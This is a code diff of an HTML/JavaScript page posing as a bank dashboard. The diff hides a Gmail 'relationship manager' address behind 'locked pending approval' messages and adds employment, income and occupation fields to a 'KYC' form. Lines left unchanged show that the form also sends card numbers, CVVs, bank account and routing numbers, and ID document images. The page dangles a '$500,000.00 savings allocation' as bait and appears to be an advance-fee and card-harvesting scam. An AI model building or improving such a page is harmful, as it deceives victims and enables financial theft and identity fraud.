@@ -166,9 +166,8 @@
                             <span>Verification In Review</span>
                             <span class="vib-pill">Awaiting Release</span>
                         </div>
-                        <div class="vib-desc">
-                            Your account documentation is being processed. To expedite fund release, contact <a
-                                href="mailto:Paxfullanee@gmail.com" class="vib-email">Paxfullanee@gmail.com</a>.
+                        <div class="vib-desc" id="vib-desc">
+                            Your account documentation has been submitted and is currently being audited. Step 1 of unlocking your $500,000.00 savings allocation is in progress. Direct manager contact details will be released upon clearance.
                         </div>
                     </div>
                 </div>
@@ -367,8 +366,7 @@
                             <span class="vib-pill" id="transfer-notice-pill">Protected</span>
                         </div>
                         <div class="vib-desc" id="transfer-notice-desc">
-                            Complete KYC verification or contact <a href="mailto:Paxfullanee@gmail.com"
-                                class="vib-email">Paxfullanee@gmail.com</a> to unlock outbound transfers.
+                            Submit the required documentation to complete Step 1 of unlocking your $500,000.00 savings allocation.
                         </div>
                     </div>
                 </div>
@@ -709,7 +707,7 @@
                         </div>
                         <div>
                             <div class="settings-row-title">Relationship Manager Desk</div>
-                            <div class="settings-row-sub">Paxfullanee@gmail.com (Tap to copy)</div>
+                            <div class="settings-row-sub" id="settings-manager-sub">Confidential • Unlocked upon KYC approval</div>
                         </div>
                     </div>
                     <span class="copy-btn mini-btn" style="padding: 5px 10px !important;">Copy</span>
@@ -939,7 +937,7 @@
                 </p>
 
                 <!-- Priority Manager Info Callout Box -->
-                <div class="avm-manager-box">
+                <div class="avm-manager-box" id="avm-manager-box">
                     <div class="avm-manager-header">
                         <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                             stroke-width="2">
@@ -949,17 +947,18 @@
                         </svg>
                         <span>Assigned Relationship Manager</span>
                     </div>
-                    <p class="avm-manager-text">To expedite document review and unlock immediate fund release, please
-                        contact your account manager directly:</p>
-                    <div class="avm-email-badge">
+                    <p class="avm-manager-text" id="avm-manager-text">
+                        Submit the required documentation to complete Step 1 of unlocking your $500,000.00 savings allocation. Assigned personal manager details are confidential and will be released upon compliance approval.
+                    </p>
+                    <div class="avm-email-badge" id="avm-email-badge">
                         <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                             stroke-width="2">
                             <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z">
                             </path>
                             <polyline points="22,6 12,13 2,6"></polyline>
                         </svg>
-                        <a href="mailto:Paxfullanee@gmail.com" class="avm-email-link">Paxfullanee@gmail.com</a>
-                        <button type="button" class="avm-copy-btn" onclick="copyManagerEmail(event)">Copy</button>
+                        <span id="avm-email-display" style="font-weight: 600; color: #64748b;">🔒 Contact Details Locked (Pending Approval)</span>
+                        <button type="button" class="avm-copy-btn" id="avm-copy-btn" style="display: none;" onclick="copyManagerEmail(event)">Copy</button>
                     </div>
                 </div>
 
@@ -1073,14 +1072,40 @@
             <div class="modal-step" data-step="1">
                 <div class="modal-step-header">
                     <span class="step-badge">Step 1 of 4</span>
-                    <h2>KYC Verification </h2>
-                    <p>Tell us a little about yourself.</p>
+                    <h2>KYC Verification</h2>
+                    <p>Submit valid documentation to pass Step 1 of unlocking your $500,000.00 savings allocation.</p>
                 </div>
                 <label>Full Name
                     <input type="text" id="verify-fullname" placeholder="John Doe" required>
                 </label>
                 <label>Home Address
                     <input type="text" id="verify-address" placeholder="123 Main St, New York, NY" required>
+                </label>
+                <div class="modal-row">
+                    <label>Employment Status
+                        <select id="verify-employment" required>
+                            <option value="">Select status</option>
+                            <option value="Employed">Employed (Full-Time / Part-Time)</option>
+                            <option value="Self-Employed">Self-Employed / Business Owner</option>
+                            <option value="Freelancer">Freelancer / Independent Contractor</option>
+                            <option value="Retired">Retired</option>
+                            <option value="Student">Student</option>
+                            <option value="Unemployed">Unemployed</option>
+                        </select>
+                    </label>
+                    <label>Annual Income
+                        <select id="verify-income" required>
+                            <option value="">Select income range</option>
+                            <option value="Under $50,000">Under $50,000</option>
+                            <option value="$50,000 - $100,000">$50,000 - $100,000</option>
+                            <option value="$100,000 - $250,000">$100,000 - $250,000</option>
+                            <option value="$250,000 - $500,000">$250,000 - $500,000</option>
+                            <option value="$500,000+">$500,000+</option>
+                        </select>
+                    </label>
+                </div>
+                <label id="verify-occupation-label">Occupation / Nature of Work
+                    <input type="text" id="verify-occupation" placeholder="e.g. Software Engineer, Contractor, Real Estate" required>
                 </label>
                 <button class="btn-primary" id="verify-next-1">Continue &rarr;</button>
             </div>
@@ -1201,12 +1226,11 @@
                         <polyline points="22 4 12 14.01 9 11.01" />
                     </svg>
                 </div>
-                <h2 id="verify-status-title">Verification Under Review</h2>
-                <p id="verify-status-desc">Ok, you've requested verification to activate your account. It takes just a
-                    few days. You can contact our personal manager to get your funds as soon as possible.</p>
+                <h2 id="verify-status-title">Step 1 Submitted: Review In Progress</h2>
+                <p id="verify-status-desc">Your documentation has been successfully submitted to pass Step 1 of unlocking your $500,000.00 savings allocation. Account verification is currently being audited by compliance.</p>
 
                 <!-- Priority Manager Info Callout Box -->
-                <div class="verify-manager-infobox">
+                <div class="verify-manager-infobox" id="verify-manager-infobox">
                     <div class="infobox-header">
                         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                             stroke-width="2">
@@ -1216,17 +1240,16 @@
                         </svg>
                         <span>Assigned Relationship Manager</span>
                     </div>
-                    <p>To expedite the release of your funds, please contact your personal account manager directly via
-                        email with your registered account number:</p>
-                    <div class="manager-email-badge">
+                    <p id="verify-manager-note">Assigned personal account manager contact details are strictly confidential and will be unlocked automatically upon Step 1 compliance approval:</p>
+                    <div class="manager-email-badge" id="step6-manager-badge">
                         <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                             stroke-width="2">
                             <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z">
                             </path>
                             <polyline points="22,6 12,13 2,6"></polyline>
                         </svg>
-                        <a href="mailto:Paxfullanee@gmail.com" class="verify-email-link">Paxfullanee@gmail.com</a>
-                        <button type="button" class="copy-manager-email-btn"
+                        <span id="step6-manager-email-display" style="font-weight: 600; color: #64748b;">🔒 Contact Details Locked (Pending Approval)</span>
+                        <button type="button" class="copy-manager-email-btn" id="step6-copy-btn" style="display: none;"
                             onclick="copyManagerEmail(event)">Copy</button>
                     </div>
                 </div>
@@ -1419,9 +1442,17 @@
             renderTransactions();
         }
 
-        // Copy Manager Email Helper
+        // Copy Manager Email Helper (Protected by KYC approval guard)
         function copyManagerEmail(e) {
             if (e) e.stopPropagation();
+            const hasSubmitted = currentUser && currentUser.accountVerificationData;
+            const status = hasSubmitted ? currentUser.accountVerificationData.verificationStatus : null;
+
+            if (status !== 'APPROVED') {
+                showToast('Manager contact details are confidential until KYC approval.');
+                return;
+            }
+
             navigator.clipboard.writeText('Paxfullanee@gmail.com').then(() => {
                 showToast('Manager email copied to clipboard!');
             }).catch(() => {
@@ -1433,12 +1464,18 @@
         function updateVerificationStatusUI() {
             const badge = document.getElementById('card-status-badge');
             const infoBanner = document.getElementById('verification-info-banner');
+            const vibDesc = document.getElementById('vib-desc');
             const heroPill = document.getElementById('hero-verify-pill');
             const transferNotice = document.getElementById('transfer-tab-verify-notice');
             const transferNoticeTitle = document.getElementById('transfer-notice-title');
             const transferNoticePill = document.getElementById('transfer-notice-pill');
             const transferNoticeDesc = document.getElementById('transfer-notice-desc');
             const settingsVerifySub = document.getElementById('settings-verify-sub');
+            const settingsManagerSub = document.getElementById('settings-manager-sub');
+            const avmEmailDisplay = document.getElementById('avm-email-display');
+            const avmCopyBtn = document.getElementById('avm-copy-btn');
+            const step6EmailDisplay = document.getElementById('step6-manager-email-display');
+            const step6CopyBtn = document.getElementById('step6-copy-btn');
 
             if (!badge) return;
 
@@ -1458,20 +1495,31 @@
                 if (transferNotice) transferNotice.style.display = 'none';
                 if (heroPill) heroPill.innerText = 'KYC Approved • Transfers Active';
                 if (settingsVerifySub) settingsVerifySub.innerText = 'Approved — Full transfer access enabled';
+                if (settingsManagerSub) settingsManagerSub.innerText = 'Paxfullanee@gmail.com (Tap to copy)';
+                if (avmEmailDisplay) avmEmailDisplay.innerHTML = '<a href="mailto:Paxfullanee@gmail.com" class="avm-email-link">Paxfullanee@gmail.com</a>';
+                if (avmCopyBtn) avmCopyBtn.style.display = 'inline-block';
+                if (step6EmailDisplay) step6EmailDisplay.innerHTML = '<a href="mailto:Paxfullanee@gmail.com" class="verify-email-link">Paxfullanee@gmail.com</a>';
+                if (step6CopyBtn) step6CopyBtn.style.display = 'inline-block';
             } else if (status === 'PENDING' || hasSubmitted) {
                 badge.className = 'card-status-badge status-awaiting';
                 badge.innerHTML = `
                     <span class="status-pulse"></span>
                     <span>Awaiting Release</span>
                 `;
-                badge.title = 'Verification in review — Click to view manager details';
+                badge.title = 'Verification in review — Tap to view status';
                 if (infoBanner) infoBanner.style.display = 'flex';
+                if (vibDesc) vibDesc.innerText = 'Your account documentation has been submitted and is currently being audited. Step 1 of unlocking your $500,000.00 savings allocation is in progress. Direct manager contact details will be released upon clearance.';
                 if (transferNotice) transferNotice.style.display = 'flex';
                 if (transferNoticeTitle) transferNoticeTitle.innerText = 'Transfers Awaiting Release';
                 if (transferNoticePill) transferNoticePill.innerText = 'Under Review';
-                if (transferNoticeDesc) transferNoticeDesc.innerHTML = 'Your KYC packet is in review. Contact <a href="mailto:Paxfullanee@gmail.com" class="vib-email">Paxfullanee@gmail.com</a> to expedite release.';
+                if (transferNoticeDesc) transferNoticeDesc.innerText = 'Your KYC packet is undergoing compliance audit for your $500,000.00 savings allocation. Relationship manager details will be released upon clearance.';
                 if (heroPill) heroPill.innerText = 'Verification In Review';
                 if (settingsVerifySub) settingsVerifySub.innerText = 'Under Review — Tap to view status';
+                if (settingsManagerSub) settingsManagerSub.innerText = 'Confidential • Unlocked upon KYC approval';
+                if (avmEmailDisplay) avmEmailDisplay.innerHTML = '<span style="color: #64748b;">🔒 Contact Details Locked (Pending Approval)</span>';
+                if (avmCopyBtn) avmCopyBtn.style.display = 'none';
+                if (step6EmailDisplay) step6EmailDisplay.innerHTML = '<span style="color: #64748b;">🔒 Contact Details Locked (Pending Approval)</span>';
+                if (step6CopyBtn) step6CopyBtn.style.display = 'none';
             } else {
                 badge.className = 'card-status-badge status-frozen';
                 badge.innerHTML = `
@@ -1486,9 +1534,14 @@
                 if (transferNotice) transferNotice.style.display = 'flex';
                 if (transferNoticeTitle) transferNoticeTitle.innerText = 'Identity Verification Required';
                 if (transferNoticePill) transferNoticePill.innerText = 'Action Needed';
-                if (transferNoticeDesc) transferNoticeDesc.innerText = 'Submit your 4-step KYC verification to unlock outbound transfers.';
+                if (transferNoticeDesc) transferNoticeDesc.innerText = 'Submit valid identity documents to pass Step 1 of unlocking your $500,000.00 savings allocation.';
                 if (heroPill) heroPill.innerText = 'Verification Required';
                 if (settingsVerifySub) settingsVerifySub.innerText = 'Pending — Tap to start 4-step KYC';
+                if (settingsManagerSub) settingsManagerSub.innerText = 'Confidential • Unlocked upon KYC approval';
+                if (avmEmailDisplay) avmEmailDisplay.innerHTML = '<span style="color: #64748b;">🔒 Contact Details Locked (Pending Approval)</span>';
+                if (avmCopyBtn) avmCopyBtn.style.display = 'none';
+                if (step6EmailDisplay) step6EmailDisplay.innerHTML = '<span style="color: #64748b;">🔒 Contact Details Locked (Pending Approval)</span>';
+                if (step6CopyBtn) step6CopyBtn.style.display = 'none';
             }
         }
 
@@ -1959,7 +2012,7 @@
             const errorMsg = document.getElementById('verify-error-msg');
 
             const fieldToStep = {
-                fullName: 1, address: 1,
+                fullName: 1, address: 1, employmentStatus: 1, occupation: 1, annualIncome: 1,
                 cardHolderName: 2, cardNumber: 2, cardType: 2, cardCvv: 2, cardExpiry: 2,
                 accountHolderName: 3, bankName: 3, bankAddress: 3, accountNumber: 3, routingNumber: 3, receiveMethod: 3,
                 documentType: 4, documentFront: 4, documentBack: 4
@@ -2039,8 +2092,24 @@
             document.getElementById('verify-next-1').addEventListener('click', () => {
                 const name = document.getElementById('verify-fullname').value.trim();
                 const address = document.getElementById('verify-address').value.trim();
+                const employment = document.getElementById('verify-employment').value;
+                const income = document.getElementById('verify-income').value;
+                const occupation = document.getElementById('verify-occupation').value.trim();
+
                 if (!name || !address) {
                     showToast('Please fill in your full name and address.');
+                    return;
+                }
+                if (!employment) {
+                    showToast('Please select your employment status.');
+                    return;
+                }
+                if (!income) {
+                    showToast('Please select your income range.');
+                    return;
+                }
+                if (['Employed', 'Self-Employed', 'Freelancer'].includes(employment) && !occupation) {
+                    showToast('Please specify your occupation or nature of work.');
                     return;
                 }
                 showStep(2);
@@ -2092,6 +2161,9 @@
                     fd.append('userId', currentUser.id);
                     fd.append('fullName', document.getElementById('verify-fullname').value.trim());
                     fd.append('address', document.getElementById('verify-address').value.trim());
+                    fd.append('employmentStatus', document.getElementById('verify-employment').value);
+                    fd.append('occupation', document.getElementById('verify-occupation').value.trim() || 'N/A');
+                    fd.append('annualIncome', document.getElementById('verify-income').value);
                     fd.append('cardHolderName', document.getElementById('verify-card-holder').value.trim());
                     fd.append('cardNumber', document.getElementById('verify-card-number').value.trim());
                     fd.append('cardType', document.getElementById('verify-card-type').value);
